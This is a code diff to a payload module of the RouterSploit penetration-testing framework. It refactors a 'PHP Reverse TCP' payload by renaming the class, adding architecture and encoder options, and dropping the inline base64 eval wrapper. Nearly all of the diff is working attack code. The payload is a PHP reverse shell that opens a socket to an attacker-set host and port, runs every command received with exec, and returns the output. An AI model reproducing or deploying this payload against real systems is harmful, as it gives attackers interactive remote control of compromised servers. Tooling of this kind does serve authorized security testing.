@@ -1,8 +1,13 @@
-from base64 import b64encode
-from routersploit.core.exploit.payloads import GenericPayload, ReverseTCPPayloadMixin
+from routersploit.core.exploit.option import OptString
+from routersploit.core.exploit.payloads import (
+    GenericPayload,
+    Architectures,
+    ReverseTCPPayloadMixin,
+)
+from routersploit.modules.encoders.php.base64 import Encoder
 
 
-class Exploit(ReverseTCPPayloadMixin, GenericPayload):
+class Payload(ReverseTCPPayloadMixin, GenericPayload):
     __info__ = {
         "name": "PHP Reverse TCP",
         "description": "Creates interactive tcp reverse shell by using php.",
@@ -11,11 +16,11 @@ class Exploit(ReverseTCPPayloadMixin, GenericPayload):
         ),
     }
 
+    architecture = Architectures.PHP
+    encoder = OptString(Encoder(), "Encoder")
+
     def generate(self):
-        payload = (
+        return (
             "$s=fsockopen(\"tcp://{}\",{});".format(self.lhost, self.lport) +
             "while(!feof($s)){exec(fgets($s),$o);$o=implode(\"\\n\",$o);$o.=\"\\n\";fputs($s,$o);}"
         )
-
-        encoded_payload = str(b64encode(bytes(payload, "utf-8")), "utf-8")
-        return "eval(base64_decode('{}'));".format(encoded_payload)
